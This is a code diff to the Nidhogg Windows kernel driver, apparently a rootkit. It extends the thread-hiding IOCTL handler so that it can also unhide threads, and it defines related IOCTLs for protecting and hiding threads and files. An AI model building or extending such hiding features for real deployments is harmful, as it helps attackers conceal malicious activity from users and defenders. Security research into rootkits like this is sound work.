@@ -15,7 +15,7 @@
 
 #define IOCTL_PROTECT_UNPROTECT_THREAD CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_HIDE_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_UNHIDE_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 #define IOCTL_PROTECT_UNPROTECT_FILE CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -310,30 +310,37 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_HIDE_THREAD:
+	case IOCTL_HIDE_UNHIDE_THREAD:
 	{
 		ULONG tid = 0;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!VALID_SIZE(size, sizeof(ULONG))) {
+		if (!VALID_SIZE(size, sizeof(InputHiddenThread))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
-		tid = *data;
+		auto data = (InputHiddenThread*)Irp->AssociatedIrp.SystemBuffer;
+		tid = data->Tid;
 
 		if (tid <= 0) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		status = NidhoggProccessUtils->HideThread(tid);
+		if (data->Hide)
+			status = NidhoggProccessUtils->HideThread(tid);
+		else
+			status = NidhoggProccessUtils->UnhideThread(tid);
 
-		if (NT_SUCCESS(status))
-			Print(DRIVER_PREFIX "Hid thread with tid %d.\n", tid);
+		if (NT_SUCCESS(status)) {
+			if (data->Hide)
+				Print(DRIVER_PREFIX "Hid thread with tid %d.\n", tid);
+			else
+				Print(DRIVER_PREFIX "Unhide thread with tid %d.\n", tid);
+		}
 
-		len += sizeof(ULONG);
+		len += sizeof(InputHiddenThread);
 		break;
 	}
 
